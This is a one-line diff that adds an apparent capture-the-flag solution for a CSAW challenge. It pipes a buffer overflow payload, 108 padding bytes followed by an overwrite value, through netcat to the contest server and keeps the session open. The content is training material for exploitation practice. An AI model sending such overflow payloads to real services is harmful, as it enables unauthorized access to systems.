@@ -1,0 +1,2 @@
+(python -c "print 'A'*108 + '\x15\x00\x00\x00'"; cat -) | nc pwn.chal.csaw.io 10106
+
